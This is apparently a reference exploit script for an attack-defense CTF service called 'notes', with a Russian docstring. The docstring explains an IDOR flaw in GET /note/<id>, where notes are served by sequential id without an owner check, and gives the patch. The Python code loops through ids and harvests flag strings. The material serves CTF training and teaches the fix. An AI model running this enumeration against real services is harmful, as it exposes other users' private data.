"""ЭТАЛОН: notes — IDOR в /note/<id>.

Уязвимость: GET /note/<id> отдаёт любую заметку по числовому id без проверки,
что она принадлежит вызывающему. id последовательные -> перебираем и читаем чужие
(в т.ч. заметки чекера с флагами).

Патч (в services/notes/app.py, get_note): сверять n["owner"] с whoami(),
иначе 403. Тогда SLA (чекер читает СВОИ заметки с токеном) не ломается.
"""
import re
import requests

SERVICE = "notes"
FLAG = re.compile(r"[A-Z0-9]{31}=")


def exploit(host, port, max_id=400):
    base = f"http://{host}:{port}"
    flags = []
    for i in range(1, max_id + 1):
        try:
            r = requests.get(f"{base}/note/{i}", timeout=2)
        except requests.RequestException:
            break
        if r.status_code == 200:
            flags += FLAG.findall(r.json().get("body", ""))
    return flags
